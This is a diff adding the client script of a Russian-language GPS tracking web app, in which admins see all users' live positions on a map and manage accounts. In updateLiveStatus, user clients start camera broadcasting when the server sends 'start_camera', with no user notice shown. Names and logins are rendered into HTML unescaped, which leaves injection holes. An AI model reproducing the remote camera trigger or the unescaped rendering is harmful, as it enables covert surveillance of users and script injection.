@@ -1,0 +1,256 @@
+// Глобальные переменные
+let map, userMarker, watchId = null, trackPoints = [], polyline = null;
+let startMarker = null, endMarker = null;
+let isSimulating = false, simInterval = null, startTime = null;
+let trackingStartTime = null;
+let lastGpsTime = 0;
+let lastHeading = 0;
+let otherUsersMarkers = {}; 
+const deviceId = Math.random().toString(36).substring(7);
+let currentUser = null;
+
+// --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
+
+function formatTime(seconds) {
+    const h = Math.floor(seconds / 3600);
+    const m = Math.floor((seconds % 3600) / 60);
+    const s = seconds % 60;
+    return [h, m, s].map(v => v < 10 ? "0" + v : v).join(":");
+}
+
+function showTab(tabId) {
+    document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+    document.querySelectorAll('.nav-tabs button').forEach(b => b.classList.remove('active'));
+    
+    const targetTab = document.getElementById('tab-' + tabId);
+    const targetBtn = document.getElementById('tab-btn-' + tabId);
+    
+    if (targetTab) targetTab.style.display = 'block';
+    if (targetBtn) targetBtn.classList.add('active');
+
+    if (tabId === 'history') renderHistory();
+    if (tabId === 'markers') renderMarkers();
+    if (tabId === 'admin-users') renderAdminUsers();
+}
+
+async function updateLiveStatus() {
+    const currentPos = userMarker ? userMarker.getLatLng() : null;
+    const heading = lastHeading;
+    const speed = 0; // Можно добавить расчет скорости
+
+    try {
+        const response = await fetch('/api/live', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                deviceId: deviceId,
+                lat: currentPos ? currentPos.lat : null,
+                lng: currentPos ? currentPos.lng : null,
+                heading: heading,
+                speed: speed
+            })
+        });
+        
+        const data = await response.json();
+        
+        // ЛОГИКА ДЛЯ ПОЛЬЗОВАТЕЛЯ: Слушаем команды от админа
+        if (currentUser?.role !== 'admin' && data.command === 'start_camera') {
+            startBroadcasting();
+        }
+
+        // ЛОГИКА ДЛЯ АДМИНА: Рисуем других
+        if (currentUser?.role === 'admin' && data.users) {
+            const allUsers = data.users;
+            Object.keys(allUsers).forEach(id => {
+                if (id === deviceId) return;
+                const user = allUsers[id];
+                if (user && typeof user === 'object' && user.lat != null && user.lng != null) {
+                    const rotation = user.heading || 0;
+                    const speedKmh = user.speed ? Math.round(user.speed) : 0;
+                    
+                    if (otherUsersMarkers[id]) {
+                        otherUsersMarkers[id].setLatLng([user.lat, user.lng]);
+                        const iconEl = otherUsersMarkers[id].getElement();
+                        if (iconEl) {
+                            const arrow = iconEl.querySelector('.arrow-icon');
+                            const speedLabel = iconEl.querySelector('.speed-label');
+                            if (arrow) arrow.style.transform = `rotate(${rotation}deg)`;
+                            if (speedLabel) speedLabel.innerText = `${speedKmh} км/ч`;
+                        }
+                    } else {
+                        otherUsersMarkers[id] = L.marker([user.lat, user.lng], {
+                            icon: L.divIcon({
+                                className: 'custom-user-marker',
+                                iconSize: [40, 40],
+                                iconAnchor: [20, 20],
+                                html: `
+                                    <div style="position: relative; width: 40px; height: 40px; display: flex; flex-direction: column; align-items: center;">
+                                        <div class="speed-label" style="background: rgba(0,0,0,0.7); color: white; padding: 1px 4px; border-radius: 4px; font-size: 9px; margin-bottom: 2px; white-space: nowrap;">${speedKmh} км/ч</div>
+                                        <div class="arrow-icon" style="width: 0; height: 0; border-left: 8px solid transparent; border-right: 8px solid transparent; border-bottom: 20px solid #ef4444; transform: rotate(${rotation}deg); transition: transform 0.3s;"></div>
+                                        <div style="background: white; padding: 1px 4px; border-radius: 4px; font-size: 10px; color: black; font-weight: bold; margin-top: 2px; box-shadow: 0 2px 4px rgba(0,0,0,0.3);">${user.name || 'User'}</div>
+                                    </div>`
+                            })
+                        }).addTo(map);
+                    }
+                }
+            });
+
+            Object.keys(otherUsersMarkers).forEach(id => {
+                if (!allUsers[id]) {
+                    map.removeLayer(otherUsersMarkers[id]);
+                    delete otherUsersMarkers[id];
+                }
+            });
+        }
+    } catch (e) {
+        console.error("Live update error:", e);
+    }
+}
+
+function updateHUD() {
+    const hudStatus = document.getElementById('hud-gps-status');
+    const hudSats = document.getElementById('hud-satellites');
+    const hudTime = document.getElementById('hud-time');
+
+    if (hudStatus) {
+        hudStatus.innerText = (watchId || isSimulating) ? 'ACTIVE' : 'OFF';
+        hudStatus.style.color = (watchId || isSimulating) ? '#10b981' : '#ef4444';
+    }
+    if (hudSats) {
+        hudSats.innerText = isSimulating ? 'SIM' : (watchId ? 'FIX' : '0');
+    }
+    if (hudTime) {
+        hudTime.innerText = new Date().toLocaleTimeString();
+    }
+}
+
+function toggleTracking() {
+    const isTest = document.getElementById('test-mode').checked;
+    const btn = document.getElementById('start-gps');
+
+    if (watchId || isSimulating) {
+        // Остановить
+        if (watchId) navigator.geolocation.clearWatch(watchId);
+        if (simInterval) clearInterval(simInterval);
+        watchId = null;
+        isSimulating = false;
+        btn.innerText = '🛰️ Начать отслеживание';
+        btn.style.background = '';
+    } else {
+        // Начать
+        if (isTest) {
+            startSimulation();
+        } else {
+            startRealTracking();
+        }
+        btn.innerText = '🛑 Остановить тест';
+        btn.style.background = 'linear-gradient(45deg, #ef4444, #7f1d1d)';
+    }
+    updateHUD();
+}
+
+function startSimulation() {
+    isSimulating = true;
+    let lat = 55.7558, lng = 37.6173;
+    simInterval = setInterval(() => {
+        lat += (Math.random() - 0.5) * 0.001;
+        lng += (Math.random() - 0.5) * 0.001;
+        updatePosition({ coords: { latitude: lat, longitude: lng, heading: Math.random() * 360, speed: Math.random() * 10 } });
+    }, 1000);
+}
+
+function startRealTracking() {
+    if (!navigator.geolocation) return alert("GPS не поддерживается");
+    watchId = navigator.geolocation.watchPosition(updatePosition, (err) => console.error(err), {
+        enableHighAccuracy: true
+    });
+}
+
+function updatePosition(pos) {
+    const { latitude, longitude, heading } = pos.coords;
+    const latlng = [latitude, longitude];
+
+    if (!userMarker) {
+        userMarker = L.marker(latlng).addTo(map);
+        map.setView(latlng, 15);
+    } else {
+        userMarker.setLatLng(latlng);
+    }
+
+    if (heading != null) {
+        lastHeading = heading;
+        document.getElementById('compass-arrow').style.transform = `translate(-50%, -50%) rotate(${heading}deg)`;
+    }
+}
+
+function toggleTheme() {
+    document.body.classList.toggle('dark-mode');
+    const isDark = document.body.classList.contains('dark-mode');
+    document.getElementById('map').style.filter = isDark ? 'invert(100%) hue-rotate(180deg) brightness(95%)' : 'none';
+}
+
+async function renderAdminUsers() {
+    const res = await fetch('/api/admin/users');
+    const users = await res.json();
+    const list = document.getElementById('admin-users-list');
+    if (!list) return;
+    list.innerHTML = users.map(u => `
+        <div class="section" style="display: flex; justify-content: space-between; align-items: center; font-size: 11px;">
+            <span>${u.login} (${u.role})</span>
+            <button onclick="deleteUser('${u.login}')" style="width: auto; padding: 2px 8px; margin: 0; background: #ef4444;">X</button>
+        </div>
+    `).join('');
+}
+
+async function deleteUser(login) {
+    if (!confirm(`Удалить ${login}?`)) return;
+    await fetch('/api/admin/delete-user', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ login })
+    });
+    renderAdminUsers();
+}
+
+// --- ИНИЦИАЛИЗАЦИЯ ---
+
+document.addEventListener('DOMContentLoaded', async () => {
+    // Карта
+    map = L.map('map', { zoomControl: false }).setView([55.7558, 37.6173], 13);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+    
+    setTimeout(() => map.invalidateSize(), 500);
+    window.addEventListener('resize', () => map.invalidateSize());
+
+    // События
+    document.getElementById('start-gps').onclick = toggleTracking;
+    document.getElementById('theme-toggle').onclick = toggleTheme;
+    document.getElementById('add-marker').onclick = () => showTab('markers');
+    
+    const btnCreateUser = document.getElementById('btn-create-user');
+    if (btnCreateUser) {
+        btnCreateUser.onclick = async () => {
+            const login = document.getElementById('new-user-login').value;
+            const pass = document.getElementById('new-user-pass').value;
+            const res = await fetch('/api/admin/create-user', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ login, password: pass })
+            });
+            if ((await res.json()).success) {
+                alert("Создан");
+                renderAdminUsers();
+            }
+        };
+    }
+
+    // Проверка роли
+    const userRes = await fetch('/api/user/me');
+    currentUser = await userRes.json();
+    if (currentUser.role === 'admin') {
+        document.getElementById('tab-btn-admin-users').style.display = 'block';
+    }
+
+    setInterval(updateHUD, 1000);
+    setInterval(updateLiveStatus, 3000);
+});
